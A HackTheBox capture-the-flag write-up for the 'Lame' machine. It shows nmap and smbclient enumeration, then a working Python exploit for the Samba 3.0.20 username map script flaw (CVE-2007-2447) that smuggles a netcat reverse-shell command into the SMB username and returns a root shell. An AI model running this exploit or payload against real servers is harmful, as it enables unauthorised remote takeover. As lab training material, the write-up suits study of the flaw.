---
title: Lame Machine Writeup- HackTheBox
author: pwnd_root
date: 2020-07-08 22:30:00 +0530
excerpt: A linux box from HackTheBox- owned by exploiting a vulnerability in the samba service, without metasploit.
thumbnail: /assets/img/posts/lame/info.png
categories: [HackTheBox, Machine]
tags: [htb, samba, without metasploit, linux]
---

*[Image: Info Card]*

## Methodology
1. Port Enumeration
2. Samba version enumeration
3. Manual exploit
4. Root access to target

## Ports Enumeration
The nmap open ports scan had identified 4 open ports- ftp (21), ssh (22), netbios-ssn (139) and microsoft-ds (445) 
with no reported vulnerability.
```
[pwnd_root@manjaro Lame]$ targetRecon 10.10.10.3
[+] Open Ports Scan
        21      ftp
        22      ssh
        139     netbios-ssn
        445     microsoft-ds
[+] Scripts Scan
                 nmap -sV -sC --script=vuln -p 21 10.10.10.3

Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-06 22:12 IST
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for 10.10.10.3 (10.10.10.3)
Host is up (0.33s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_sslv2-drown: 
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 57.40 seconds

                 nmap -sV -sC --script=vuln -p 22 10.10.10.3

Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-06 22:13 IST
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for 10.10.10.3 (10.10.10.3)
Host is up (0.29s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
| vulners: 
|   cpe:/a:openbsd:openssh:4.7p1: 
|       CVE-2010-4478   7.5     https://vulners.com/cve/CVE-2010-4478                                                                                                            
|       CVE-2017-15906  5.0     https://vulners.com/cve/CVE-2017-15906                                                                                                           
|       CVE-2016-10708  5.0     https://vulners.com/cve/CVE-2016-10708                                                                                                           
|       CVE-2010-4755   4.0     https://vulners.com/cve/CVE-2010-4755                                                                                                            
|_      CVE-2008-5161   2.6     https://vulners.com/cve/CVE-2008-5161                                                                                                            
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel                                                                                                                          

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                                                   
Nmap done: 1 IP address (1 host up) scanned in 36.84 seconds                                                                                                                     

                 nmap -sV -sC --script=vuln -p 139 10.10.10.3

Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-06 22:14 IST                                                                                                                  
Pre-scan script results:                                                                                                                                                         
| broadcast-avahi-dos:                                                                                                                                                           
|   Discovered hosts:                                                                                                                                                            
|     224.0.0.251                                                                                                                                                                
|   After NULL UDP avahi packet DoS (CVE-2011-1002).                                                                                                                             
|_  Hosts are all up (not vulnerable).                                                                                                                                           
Nmap scan report for 10.10.10.3 (10.10.10.3)                                                                                                                                     
Host is up (0.35s latency).                                                                                                                                                      

PORT    STATE SERVICE     VERSION                                                                                                                                                
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)                                                                                                            
|_clamav-exec: ERROR: Script execution failed (use -d to debug)                                                                                                                  
|_smb-vuln-webexec: ERROR: Script execution failed (use -d to debug)                                                                                                             

Host script results:                                                                                                                                                             
|_smb-double-pulsar-backdoor: ERROR: Script execution failed (use -d to debug)                                                                                                   
|_smb-vuln-cve-2017-7494: ERROR: Script execution failed (use -d to debug)                                                                                                       
|_smb-vuln-ms06-025: ERROR: Script execution failed (use -d to debug)                                                                                                            
|_smb-vuln-ms07-029: ERROR: Script execution failed (use -d to debug)                                                                                                            
|_smb-vuln-ms08-067: ERROR: Script execution failed (use -d to debug)                                                                                                            
|_smb-vuln-ms10-054: false                                                                                                                                                       
|_smb-vuln-ms10-061: false                                                                                                                                                       
|_smb-vuln-ms17-010: ERROR: Script execution failed (use -d to debug)                                                                                                            
|_smb-vuln-regsvc-dos: ERROR: Script execution failed (use -d to debug)                                                                                                          

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 62.91 seconds

                 nmap -sV -sC --script=vuln -p 445 10.10.10.3

Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-06 22:15 IST
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for 10.10.10.3 (10.10.10.3)
Host is up (0.28s latency).

PORT    STATE SERVICE     VERSION
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_smb-vuln-webexec: ERROR: Script execution failed (use -d to debug)

Host script results:
|_smb-double-pulsar-backdoor: ERROR: Script execution failed (use -d to debug)
|_smb-vuln-cve-2017-7494: ERROR: Script execution failed (use -d to debug)
|_smb-vuln-ms06-025: ERROR: Script execution failed (use -d to debug)
|_smb-vuln-ms07-029: ERROR: Script execution failed (use -d to debug)
|_smb-vuln-ms08-067: ERROR: Script execution failed (use -d to debug)
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: false
|_smb-vuln-ms17-010: ERROR: Script execution failed (use -d to debug)
|_smb-vuln-regsvc-dos: ERROR: Script execution failed (use -d to debug)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.07 seconds

Summary 
        21      ftp     vsftpd 2.3.4
                No vuln found
        22      ssh     OpenSSH 4.7p1 Debian 8ubuntu1
                No vuln found
        139     netbios-ssn     Samba smbd 3.X - 4.X
                No vuln found
        445     microsoft-ds    Samba smbd 3.X - 4.X
                No vuln found
```
Enumerating the FTP service revealed that the service allows **'Anonymous Login'**, but offers an empty directory 
listing. Never being a fan of *vsftpd 2.3.4 backdoor command execution*, I'm keeping it as a last resort and decided to
enumerate samba next.

## Samba Service Enumeration
 The nmap scan of ports 139 and 445 neither revealed the versions nor any known vulnerabilities. <br>
 The version of the service was enumerated through *smbclient* to be **Samba 3.0.20**.
 ```
[pwnd_root@manjaro Lame]$ smbclient -L //10.10.10.3 -N
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        tmp             Disk      oh noes!
        opt             Disk      
        IPC$            IPC       IPC Service (lame server (Samba 3.0.20-Debian))
        ADMIN$          IPC       IPC Service (lame server (Samba 3.0.20-Debian))
Reconnecting with SMB1 for workgroup listing.
Anonymous login successful

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP
```
The listed shares were also enumerated for any useful or sensitive information, but to no avail. 

## Manual exploit
Searching for known exploits for *Samba 3.0.20* on exploit-db revealed a metasploit module for **Username map script 
Command Execution**. The metasploit module was converted into a manual exploit with python as follows.
```python
#!/usr/bin/python
import sys
from smb.SMBConnection import SMBConnection

def exploit(rhost, rport, lhost, lport):
    
    payload = 'mkfifo /tmp/hago; nc ' + lhost + ' ' + lport + ' 0</tmp/hago | /bin/sh >/tmp/hago 2>&1; rm /tmp/hago'
    username = "/=`nohup " + payload + "`"
    conn = SMBConnection(username, "", "", "")
    try:
        conn.connect (rhost, int(rport), timeout=1)
    except:
        print ('[+] Payload was sent')

print ('[*] CVE-2007-2447')
if len (sys.argv) != 5:
    print ("[-] usage: python " + sys.argv[0] + " <RHOST> <RPORT> <LHOST> <LPORT>")
    print ("Enusre netcat listener is running")
else:
    rhost = sys.argv[1]
    rport = sys.argv[2]
    lhost = sys.argv[3]
    lport = sys.argv[4]
    print ("[+] Connecting to " + rhost)
    exploit (rhost, rport, lhost, lport)
```

## Root access
As per the metasploit module, successful execution of the exploit should result in direct *root shell*. A netcat
listener on port 9090 was started on the attacking host and then the exploit was executed as 
```python exploit 10.10.10.3 445 10.10.14.16 9090``` resulting in a root shell being received on the netcat listener.

*[Image: Root Shell]*
